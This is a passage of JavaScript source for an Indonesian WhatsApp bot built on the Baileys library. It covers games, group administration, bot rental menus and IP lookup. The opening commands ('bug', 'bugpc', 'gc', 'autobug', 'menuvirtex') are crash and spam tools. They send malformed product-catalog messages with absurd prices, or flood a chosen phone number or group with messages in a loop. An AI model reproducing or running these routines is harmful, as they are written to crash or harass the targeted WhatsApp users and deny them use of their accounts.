 var waktu = text.split('|')[2] ? text.split('|')[2] : '-'
const men = ['loc1','loc2','loc3']
const rndmmenu =  men[Math.floor(Math.random() * (men.length))]
tod = await reSize(`./media/${rndmmenu}.png`, 200, 200)
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: tod}, { upload: alfa.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Manz Tzy`,
"description": `Kuntulll`,
"footerText":  global.copy,
"currencyCode": "IDR",
"priceAmount1000": "78263829728292",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": global.author,
"url": `https://wa.me/6281327496283?text=Bug+lu+ga+keras+deck+🗿`
},
"businessOwnerJid": "6281327496283@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: bug })
alfa.relayMessage(`${number}`, catalog.message, { messageId: catalog.key.id })
}
m.reply(`Succes send bug ke ${number} sebanyak ${jumlah} dengan waktu ${waktu}`)
}
break
case 'surat': {
if (!q) return m.reply('Contoh: Surat 6281327496283|Halo Syg|Alfa')
 if (!q.includes('62')) return m.reply('Masukan Nomor dengan Awal 62')
num = q.split('|')[0]+'@s.whatsapp.net'
 var txt = text.split('|')[1]
 var pengirim = text.split('|')[2]
 teks = `Saya Membawakan Surat Untuk Kk\n\n`
 for (let i of teks) {
 teks += `Dari: ${pengirim}\n`
 teks += `Surat: ${txt}`
 } 
 alfa.sendText(num, `Saya Membawakan Surat Untuk Kk\n\nDari: ${pengirim}\nSurat: ${txt}`, m)
 
 m.reply(`Sukses Mengirim Pesan Ke ${num}\n\nPesan: ${txt}\nPengirim: ${pengirim}`)
 }
 break
case 'autobug': {
if (args[0] === "on") {
if (abg) return replay('Sebelumnya Sudah On')
bug.push(m.chat)
m.reply('Auto Bug Succes On')
} else if (args[0] === "off") {
if (!abg) return replay('Sebelumnya Sudah Off')
let off = bug.indexOf(m.chat)
bug.splice(off, 1)
m.reply('Auto Bug Succes Off')
} else {
  let buttonswlcm = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await alfa.sendButtonText(m.chat, buttonswlcm, `Klick Button Untuk On/Off Kan Auto Bug`, `${copy}`, m)
  }
  }
  break
case 'bugpc': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Contoh: bugpc 6281327496283|text|jumlah|waktu;')
 if (!q.includes('62')) return m.reply('Masukan Nomor dengan Awal 62')
 var number = text.split('|')[0] ? text.split('|')[0] : '-'
 var txt = text.split('|')[1] ? text.split('|')[1] : '-'
 var jumlah = text.split('|')[2] ? text.split('|')[2] : '-'
 var waktu = text.split('|')[3] ? text.split('|')[3] : '-'
			
    for (let i = 0; i < jumlah; i++) {
alfa.sendMessage(`${number}@s.whatsapp.net`,  {text:`${txt}`},{quoted: bug})
await sleep(ms(waktu))
}
m.reply(`Succes send bug ke ${number} dengan ${txt} sebanyak ${jumlah} kecepatan ${waktu}`)
}
break
case 'vanh': {
alfa.sendMessage(m.chat,  {text: `👀`},{quoted: bug})
}
break
case 'gc': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('Contoh: gc 120363025641317889@g.us|Text|jumlah|timer')
 var number = text.split('|')[0] ? text.split('|')[0] : '-'
 var txt = text.split('|')[1] ? text.split('|')[1] : '-'
  var jumlah = text.split('|')[2] ? text.split('|')[2] : '-'
 var waktu = text.split('|')[3] ? text.split('|')[3] : '-'

							for (let i = 0; i < jumlah; i++) {
alfa.sendMessage(`${number}`,  {text:`${txt}`},{quoted: bug})
await sleep(ms(waktu))
}
m.reply(`Succes send bug ke ${number} dengan jumlah ${jumlah} dengan waktu ${waktu}`)
}
break
		case 'ttc': case 'ttt': case 'tictactoe': {
			let TicTacToe = require("./lib/tictactoe")
			this.game = this.game ? this.game : {}
			if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
			let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
			if (room) {
			m.reply('Partner ditemukan!')
			room.o = m.chat
			room.game.playerO = m.sender
			room.state = 'PLAYING'
			let arr = room.game.render().map(v => {
			return {
			X: '❌',
			O: '⭕',
			1: '1️⃣',
			2: '2️⃣',
			3: '3️⃣',
			4: '4️⃣',
			5: '5️⃣',
			6: '6️⃣',
			7: '7️⃣',
			8: '8️⃣',
			9: '9️⃣',
			}[v]
			})
			let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
			if (room.x !== room.o) await alfa.sendText(room.x, str, m, { mentions: parseMention(str) } )
			await alfa.sendText(room.o, str, m, { mentions: parseMention(str) } )
			} else {
			room = {
			id: 'tictactoe-' + (+new Date),
			x: m.chat,
			o: '',
			game: new TicTacToe(m.sender, 'o'),
			state: 'WAITING'
			}
			if (text) room.name = text
			m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
			this.game[room.id] = room
			}
			}
			break
			case 'delttc': case 'delttt': {
			this.game = this.game ? this.game : {}
			try {
			if (this.game) {
			delete this.game
			alfa.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
			} else if (!this.game) {
			m.reply(`Session TicTacToe🎮 tidak ada`)
			} else throw '?'
			} catch (e) {
			m.reply('rusak')
			}
			}
			break
			case 'suitpvp': case 'suit': {
			this.suit = this.suit ? this.suit : {}
			let poin = 10
			let poin_lose = 10
			let timeout = 60000
			if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
		if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
			if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
			if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
			let id = 'suit_' + new Date() * 1
			let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
			this.suit[id] = {
			chat: await alfa.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
			id: id,
			p: m.sender,
			p2: m.mentionedJid[0],
			status: 'wait',
			waktu: setTimeout(() => {
			if (this.suit[id]) alfa.sendText(m.chat, `_Waktu suit habis_`, m)
			delete this.suit[id]
			}, 60000), poin, poin_lose, timeout
			}
			}
			break
case 'getip': {
var http = require('http')
http.get({'host': 'api.ipify.org', 'port': 80, 'path': '/'}, function(resp) {
            resp.on('data', function(ip) {
                m.reply("My public IP address is: " + ip);
            })
        })
}
break
case 'report': {
                                                                                                                if(!text) throw `Enter The Bug Example\n\n${command} Menu Error `
                                                                                                                alfa.sendMessage(`62895397918020@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
                                                                                        Report Message: ${text}` })
                                                                                        m.reply(`Terimakasih Atas Report Bug Nya`)
                                                                                                            }
                                                                                                            break
case 'tespo': {
                                                                                                                if(!text) throw `Enter The Bug Example\n\n${command} Menu Error `
                                                                                                                alfa.sendMessage(`6285724404318@s.whatsapp.net`, {text: `*Bug Report From:* wa.me/${m.sender.split("@")[0]}
                                                                                        Report Message: ${text}` })
                                                                                        m.reply(`Terimakasih Atas Report Bug Nya`)
                                                                                                            }
                                                                                                            break
case '7h': {
                                                                alfa.sendMessage(`62895397918020@s.whatsapp.net`, {text: `*Order Buy Bot 7 Day:* wa.me/${m.sender.split("@")[0]}
                                                                                        Report Message: ${text}` })
                                                                                        m.reply(`Terimakasih Atas Order Nya, Owner Aku Akan Balas Secepatnya`)
                                                                                                            }
                                                                                                            break
case 'manen': {
                                                                alfa.sendMessage(`62895397918020@s.whatsapp.net`, {text: `*order Buy Bot Permanen:* wa.me/${m.sender.split("@")[0]}
                                                                                        Report Message: ${text}` })
                                                                                        m.reply(`Terimakasih Atas Order Nya, Owner Aku Akan Balas Secepatnya`)
                                                                                                            }
                                                                                                            break
case 'testbuy': {
                                                                alfa.sendMessage(`6285724404318@s.whatsapp.net`, {text: `*Oerder Buy Bot 7 Day:* wa.me/${m.sender.split("@")[0]}
                                                                                        Report Message: ${text}` })
                                                                                        m.reply(`Terimakasih Atas Order Nya, Owner Aku Akan Balas Secepatnya`)
                                                                                                            }
                                                                                                            break
case 'testbuy2': {
                                                                alfa.sendMessage(`6285724404318@s.whatsapp.net`, {text: `*Oerder Buy Bot Permanen:* wa.me/${m.sender.split("@")[0]}
                                                                                        Report Message: ${text}` })
                                                                                        m.reply(`Terimakasih Atas Order Nya, Owner Aku Akan Balas Secepatnya`)
                                                                                                            }
                                                                                                            break
case 'prem1': {
                                                                alfa.sendMessage(`62895397918020@s.whatsapp.net`, {text: `*Oerder Buy Prem:* wa.me/${m.sender.split("@")[0]}
                                                                                        Type: Premium 7 Hari` })
                                                                                        m.reply(`Terimakasih Atas Order Nya, Owner Aku Akan Balas Secepatnya`)
                                                                                                            }
                                                                                                            break
case 'prem2': {
                                                                alfa.sendMessage(`62895397918020@s.whatsapp.net`, {text: `*Oerder Buy Premium:* wa.me/${m.sender.split("@")[0]}
                                                                                        Type: Premium 1 Bulan` })
                                                                                        m.reply(`Terimakasih Atas Order Nya, Owner Aku Akan Balas Secepatnya`)
                                                                                                            }
                                                                                                            break
case 'testbuybot': {
let sections = [
				{
				title: "SEWA BOT + JADI OWNER 📌",
				rows: [
				{title: "Sewa Bot 7 Hari", rowId: 'testbuy', description: 'sewa bot + jadi owner'},
				{title: "Sewa Bot Permanen", rowId: 'testbuy2', description: 'sewa bot + jadi owner'},
				{title: "Ke Untungan Buy Bot", rowId: 'buybot', description: 'Untuk Menampilkan Ke Untungan Buy Bot Dan Harga Nya'},
				
				{title: "My Owner", rowId: 'owner', description: 'Nomor Pembuat Bot'},
				{title: "Rules Bot", rowId: 'sdk', description: 'Menampilkan Peraturan Penggunaan Bot'},
				{title: "Contributor Bot", rowId: 'thx', description: 'Menampilkan Perancang Script Akari Bot'},
				]
				},
				]
				alfa.sendListMsg(m.chat, `Menu Buy Prem Ada Di Bawah Kk ${pushname}`, global.copy, `Haii Kk ${pushname}`, `Click Here 👋`, sections, m)
			}
			break
		case 'donasi': case 'sewa': case 'donate': {
				donate = `${global.nasi}`
				let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								quickReplyButton: {
									displayText: 'Back To Menu',
									id: 'allmenu'
								}
							}]
							let ma = fs.readFileSync(`./lib/test.jpg`)
							alfa.send5Loc(m.chat, donate, global.copy, ma, btn)
							}
							break
				case 'sc': {
				asu = `${global.sc}`
				let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								quickReplyButton: {
									displayText: 'Donasi 💌',
									id: 'donasi'
								}
							}]
							let me = fs.readFileSync(`./lib/test.jpg`)
							alfa.send5Loc(m.chat, asu, global.copy, me, btn)
							}
							break
case 'menuvirtex': {
let virtex = `*Menu Virtex 🎭*
${hit+=1}. ${prefix}sendallv
${hit+=1}. ${prefix}v1
${hit+=1}. ${prefix}v2
${hit+=1}. ${prefix}v3
╰──⌜ *${bot}*`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My YouTube ⚡',
									url: 'https://www.youtube.com/MamzTzy'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'List Menu Nya 🌈',
									id: 'menuv'
								}
							}]
							alfa.send5ButMsg(m.chat, virtex, global.copy, btn)
}
break
case 'kaja': {
let anime = `*Random Image Anime 🌀*
${hit+=1}. ${prefix}waifu
${hit+=1}. ${prefix}waifu2
${hit+=1}. ${prefix}loli
${hit+=1}. ${prefix}yotsuba
${hit+=1}. ${prefix}minato
${hit+=1}. ${prefix}kurumi
${hit+=1}. ${prefix}sagiri
${hit+=1}. ${prefix}megumin
${hit+=1}. ${prefix}miku
${hit+=1}. ${prefix}onepice
${hit+=1}. ${prefix}shinomiya
${hit+=1}. ${prefix}yumeko
${hit+=1}. ${prefix}tejina
${hit+=1}. ${prefix}boruto
${hit+=1}. ${prefix}kotori
${hit+=1}. ${prefix}eren
${hit+=1}. ${prefix}kaori
${hit+=1}. ${prefix}shizuka
${hit+=1}. ${prefix}tsunade
${hit+=1}. ${prefix}chiho
${hit+=1}. ${prefix}kaga
${hit+=1}. ${prefix}akiyama
${hit+=1}. ${prefix}gremory
${hit+=1}. ${prefix}isuzu
${hit+=1}. ${prefix}shina
${hit+=1}. ${prefix}kagura
${hit+=1}. ${prefix}shinka
${hit+=1}. ${prefix}eba
${hit+=1}. ${prefix}elaina
${hit+=1}. ${prefix}yuri
${hit+=1}. ${prefix}erza
${hit+=1}. ${prefix}hinata
${hit+=1}. ${prefix}naruto
${hit+=1}. ${prefix}nezuko
${hit+=1}. ${prefix}rize
${hit+=1}. ${prefix}anna
${hit+=1}. ${prefix}deidara
${hit+=1}. ${prefix}yuki
${hit+=1}. ${prefix}asuna
${hit+=1}. ${prefix}ayuzawa
${hit+=1}. ${prefix}chitoge
${hit+=1}. ${prefix}emilia
${hit+=1}. ${prefix}hestia
${hit+=1}. ${prefix}inori
${hit+=1}. ${prefix}itachi
${hit+=1}. ${prefix}madara
${hit+=1}. ${prefix}sakura
${hit+=1}. ${prefix}sasuke
${hit+=1}. ${prefix}tsunade
${hit+=1}. ${prefix}keneki
${hit+=1}. ${prefix}toukachan
${hit+=1}. ${prefix}akira
${hit+=1}. ${prefix}itori
${hit+=1}. ${prefix}pokemon
╰──⌜ *${bot}*`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My YouTube ⚡',
									url: 'https://www.youtube.com/MamzTzy'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'List Menu Nya 🌈',
									id: 'mana'
								}
							}]
							alfa.send5ButMsg(m.chat, anime, global.copy, btn)
}
break
			case 'chat': {
				if (!isCreator) throw man.kus
				if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
				if (args[0] === 'mute') {
					alfa.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'unmute') {
					alfa.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'archive') {
					alfa.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'unarchive') {
					alfa.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'read') {
					alfa.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'unread') {
					alfa.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				} else if (args[0] === 'delete') {
					alfa.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
			}
			break
		case 'family100': {
				if ('family100'+m.chat in _family100) {
					m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
					throw false
				}
				let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
				let random = anu[Math.floor(Math.random() * anu.length)]
				let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
				_family100['family100'+m.chat] = {
					id: 'family100'+m.chat,
					pesan: await alfa.sendText(m.chat, hasil, m),
					...random,
					terjawab: Array.from(random.jawaban, () => false),
					hadiah: 6,
				}
			}
			break
			case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
			if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
			ter = command[1].toLowerCase()
			tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
			m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
			break
			case 'tebak': {
				if (!text) throw `*Contoh : ${prefix + command} lagu*\nOption : \n1. _lagu_\n2. _gambar_\n3.$_kata_\n4. _kalimat_\n5. _lirik_\n6._lontong_`
				if (args[0] === "lagu") {
					if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
					let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
					let result = anu[Math.floor(Math.random() * anu.length)]
					let msg = await alfa.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mp4' }, { quoted: m })
					alfa.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
					tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
					})
					await sleep(60000)
					if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					alfa.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, alfa.user.name, m)
					delete tebaklagu[m.sender.split('@')[0]]
					}
				} else if (args[0] === 'gambar') {
					if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
					let result = anu[Math.floor(Math.random() * anu.length)]
					alfa.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
					tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
					})
					await sleep(60000)
					if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					alfa.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, alfa.user.name, m)
					delete tebakgambar[m.sender.split('@')[0]]
					}
				} else if (args[0] === 'kata') {
					if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
					let result = anu[Math.floor(Math.random() * anu.length)]
					alfa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
					tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
					})
					await sleep(60000)
					if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					alfa.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, alfa.user.name, m)
					delete tebakkata[m.sender.split('@')[0]]
					}
				} else if (args[0] === 'kalimat') {
					if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
					let result = anu[Math.floor(Math.random() * anu.length)]
					alfa.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
					tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
					})
					await sleep(60000)
					if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					alfa.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, alfa.user.name, m)
					delete tebakkalimat[m.sender.split('@')[0]]
					}
				} else if (args[0] === 'lirik') {
					if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
					let result = anu[Math.floor(Math.random() * anu.length)]
					alfa.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
					tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
					})
					await sleep(60000)
					if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					alfa.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, alfa.user.name, m)
					delete tebaklirik[m.sender.split('@')[0]]
					}
				} else if (args[0] === 'lontong') {
					if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
					let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
					let result = anu[Math.floor(Math.random() * anu.length)]
					alfa.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
					caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
			caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
					})
					await sleep(60000)
					if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					alfa.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, alfa.user.name, m)
					delete caklontong[m.sender.split('@')[0]]
			delete caklontong_desk[m.sender.split('@')[0]]
					}
				}
			}
			break
			case 'kuismath': case 'math': {
				if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
				let { genMath, modes } = require('./src/math')
				if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
				let result = await genMath(text.toLowerCase())
				alfa.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
					kuismath[m.sender.split('@')[0]] = result.jawaban
				})
				await sleep(result.waktu)
				if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
					console.log("Jawaban: " + result.jawaban)
					m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
					delete kuismath[m.sender.split('@')[0]]
				}
			}
			break
			case 'jodohku': {
			if (!m.isGroup) throw man.gcwa
			let member = participants.map(u => u.id)
			let me = m.sender
			let jodoh = member[Math.floor(Math.random() * member.length)]
			let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
			let ments = [me, jodoh]
			let buttons = [
						{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, jawab, alfa.user.name, m, {mentions: ments})
			}
			break
			case 'jadian': {
			if (!m.isGroup) throw man.gcwa
			let member = participants.map(u => u.id)
			let orang = member[Math.floor(Math.random() * member.length)]
			let jodoh = member[Math.floor(Math.random() * member.length)]
			let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
			let menst = [orang, jodoh]
			let buttons = [
						{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
					]
					await alfa.sendButtonText(m.chat, buttons, jawab, alfa.user.name, m, {mentions: menst})
			}
			break
			case 'react': {
				if (!isCreator) throw man.kus
				reactionMessage = {
					react: {
						text: args[0],
						key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
					}
				}
				alfa.sendMessage(m.chat, reactionMessage)
			}
			break  
			case 'join': {
				if (!text) throw 'Masukkan Link Group!'
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
				fakey(wet)
				let result = args[0].split('https://chat.whatsapp.com/')[1]
				await alfa.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
			}
			break
			case 'leave': {
				if (!isCreator) throw man.kus
				await alfa.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
			}
			break
			case 'setexif': {
			   if (!isCreator) throw man.kus
			   if (!text) throw `Example : ${prefix + command} packname|author`
		  global.copy = text.split("|")[0]
		  global.punya = text.split("|")[1]
		  m.reply(`Exif berhasil diubah menjadi\n\n➤ Packname : ${global.copy}\n➤ Author : ${global.punya}`)
			}
			break
	case 'out': {
		if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alfa.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alfa.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alfa.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alfa.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
		case 'block': {
		if (!isCreator) throw man.kus
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alfa.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
		case 'unblock': {
		if (!isCreator) throw man.kus
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await alfa.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
		case 'setname': case 'setsubject': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
				if (!text) throw 'Text ?'
				await alfa.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
			}
			break
		  case 'setdesc': case 'setdesk': {
				if (!m.isGroup) throw man.gcwa
				if (!isBotAdmins) throw man.bomin
				if (!isAdmins) throw man.ami
				if (!text) throw 'Text ?'
				await alfa.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
			}
			break
case 'id': {
alfa.sendMessage(m.chat, {text:`${from}`}, m)
}
break
// Created By Manz Executed
case 'setppbot': {
if (!isCreator) return m.reply(mess.owner)
